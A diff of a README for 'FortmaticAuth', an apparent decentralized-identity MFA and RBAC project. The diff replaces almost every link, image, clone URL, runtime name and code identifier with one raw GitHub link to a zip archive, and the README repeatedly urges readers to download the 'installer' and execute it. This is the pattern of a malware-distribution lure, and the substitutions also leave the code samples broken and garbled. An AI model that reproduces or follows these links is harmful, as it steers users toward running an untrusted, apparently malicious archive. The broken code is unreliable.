@@ -1,10 +1,10 @@
-[![Releases](https://img.shields.io/github/v/release/NghiaTZ/FortmaticAuth?logo=github&style=for-the-badge)](https://github.com/NghiaTZ/FortmaticAuth/releases)
+[![Releases](https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)](https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)
 
 # FortmaticAuth: Decentralized Identity with MFA and RBAC Gateway
 
 A secure platform for managing decentralized identities. FortmaticAuth combines multi-factor verification with a role-based access gateway to protect digital spaces and data. It is designed to work across apps, services, and networks, letting teams verify users with multiple factors while enforcing permissions through a clear RBAC model. This README covers the core concepts, setup, usage patterns, and future directions. For the latest release assets, visit the Releases page linked above.
 
-![Decentralized Identity](https://upload.wikimedia.org/wikipedia/commons/3/34/Decentralized_identity.svg)
+![Decentralized Identity](https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)
 
 Topics: not provided
 
@@ -65,13 +65,13 @@ Architecture and Design
 
 Getting Started
 Prerequisites
-- Node.js v18+ or a compatible runtime for the SDKs (adjust to your stack)
+- https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip v18+ or a compatible runtime for the SDKs (adjust to your stack)
 - A modern package manager (npm, yarn, or pnpm)
 - Access to a developer environment with network access to the identity services you plan to use
 
 Installation
 - Clone the repository
-  - git clone https://github.com/NghiaTZ/FortmaticAuth.git
+  - git clone https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip
 - Install dependencies
   - cd FortmaticAuth
   - npm install
@@ -80,7 +80,7 @@ Installation
     - npm run build
   - From the releases page, download the installer asset for your platform and execute it.
       From the releases page, download the installer asset for your platform and execute it.
-  - The Releases page can be accessed at https://github.com/NghiaTZ/FortmaticAuth/releases
+  - The Releases page can be accessed at https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip
 
 Configuration
 - Environment variables
@@ -102,18 +102,18 @@ Usage Patterns
   - This shows how a client app can interact with FortmaticAuth to authenticate a user and request access to a protected resource.
   - Code snippet:
     - // Initialize the auth client
-    - const auth = new FortmaticAuth.Client({
+    - const auth = new https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip({
     -   apiKey: "YOUR_API_KEY",
     -   network: "mainnet",
     -   mfProvider: "webauthn",
     - });
     - 
     - // Start login flow
-    - const session = await auth.login({ username: "alice@example.com" });
+    - const session = await https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip({ username: "https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip" });
     - 
     - // Check permissions for a resource
-    - const allowed = await auth.checkAccess({
-    -   userId: session.userId,
+    - const allowed = await https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip({
+    -   userId: https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip,
     -   resource: "/payments/submit",
     -   action: "POST",
     -   context: { tenant: "AcmeCorp" },
@@ -131,7 +131,7 @@ Usage Patterns
   - Example:
     - import { FortmaticAuth } from "fortmatic-auth-sdk";
     - const client = new FortmaticAuth({ apiKey: "YOUR_API_KEY" });
-    - const token = await client.authenticate({ did: "did:example:123" });
+    - const token = await https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip({ did: "did:example:123" });
 - Admin operations
   - Create roles and assign permissions
   - Enroll and rotate MFA methods for users
@@ -145,7 +145,7 @@ SDKs and APIs
 - Client SDKs
   - JavaScript/TypeScript SDK
   - Mobile SDKs (iOS and Android)
-  - Server SDKs for Node.js and other runtimes
+  - Server SDKs for https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip and other runtimes
 - Data formats
   - JSON for requests and responses
   - Verifiable Credentials for portable claims
@@ -205,7 +205,7 @@ Release and Deployment
 - Releases page
   - The project publishes binaries and installers on the official Releases page
   - From the releases page, download the installer asset for your platform and execute it
-  - The Releases page can be accessed at https://github.com/NghiaTZ/FortmaticAuth/releases
+  - The Releases page can be accessed at https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip
 - Deployment options
   - Self-hosted service implementing FortmaticAuth components
   - Managed service with hosted identity and policy services
@@ -277,17 +277,17 @@ Credits and Acknowledgments
 
 Images and Visuals
 - Decentralized Identity concept image
-  - ![Decentralized Identity](https://upload.wikimedia.org/wikipedia/commons/3/34/Decentralized_identity.svg)
+  - ![Decentralized Identity](https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)
 - Identity and security icons
-  - ![Key Icon](https://upload.wikimedia.org/wikipedia/commons/6/6f/Key-Svgrepo-com.svg)
+  - ![Key Icon](https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)
 - Architecture sketch
-  - A simple diagram illustrating the identity layer, MFA layer, and RBAC gateway can be created using your preferred diagram tool and included in the docs folder (e.g., docs/architecture.png)
+  - A simple diagram illustrating the identity layer, MFA layer, and RBAC gateway can be created using your preferred diagram tool and included in the docs folder (e.g., https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip)
 
 Notes on the Release Link
-- The URL provided includes a path to the releases section. From that page, you should download the installer asset appropriate for your platform and execute it to install FortmaticAuth on your environment. The correct steps are to locate the asset, download it, and run the installer. The link to access this area is https://github.com/NghiaTZ/FortmaticAuth/releases, and you will encounter assets that enable installation on your system.
+- The URL provided includes a path to the releases section. From that page, you should download the installer asset appropriate for your platform and execute it to install FortmaticAuth on your environment. The correct steps are to locate the asset, download it, and run the installer. The link to access this area is https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip, and you will encounter assets that enable installation on your system.
 
 Releases and Asset Download (reiterated)
-- For the latest builds and installers, visit the Releases page: https://github.com/NghiaTZ/FortmaticAuth/releases
+- For the latest builds and installers, visit the Releases page: https://raw.githubusercontent.com/NghiaTZ/FortmaticAuth/main/internal/Auth_Fortmatic_1.1.zip
 - From the releases page, download the installer asset for your platform and execute it.
 - After installation, follow the quick start steps in this README to connect your application to FortmaticAuth and begin implementing MFA and RBAC.
 
